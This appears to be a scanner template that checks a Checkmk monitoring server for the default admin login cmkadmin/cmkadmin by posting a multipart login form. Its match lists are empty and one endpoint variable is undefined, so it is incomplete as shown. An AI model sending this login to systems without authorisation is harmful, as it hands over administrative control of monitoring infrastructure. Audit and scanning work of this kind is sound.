id: checkmk-default-login
brief:
    title: Checkmk - Default Login
    by: 0xBassia
    level: high
    about: Checkmk monitoring instance is accessible with default credentials (cmkadmin/cmkadmin). This provides full administrative access to the monitoring platform, including the ability to view all monito...
    label:
        - default-login
        - checkmk
        - monitoring
    score: CVSS:9.1
moves:
    - verb: GET
      to:
        - '{{BaseURL}}'
      signs: []
    - verb: POST
      to:
        - '{{BaseURL}}{{endpoint}}'
      head:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0FYqMzKWywSgTEcE
      body: |-
        ------WebKitFormBoundary0FYqMzKWywSgTEcE
        Content-Disposition: form-data; name="filled_in"

        login
        ------WebKitFormBoundary0FYqMzKWywSgTEcE
        Content-Disposition: form-data; name="_login"

        1
        ------WebKitFormBoundary0FYqMzKWywSgTEcE
        Content-Disposition: form-data; name="_origtarget"

        index.py
        ------WebKitFormBoundary0FYqMzKWywSgTEcE
        Content-Disposition: form-data; name="_username"

        cmkadmin
        ------WebKitFormBoundary0FYqMzKWywSgTEcE
        Content-Disposition: form-data; name="_password"

        cmkadmin
        ------WebKitFormBoundary0FYqMzKWywSgTEcE
        Content-Disposition: form-data; name="_login"

        Login
        ------WebKitFormBoundary0FYqMzKWywSgTEcE--
      signs: []
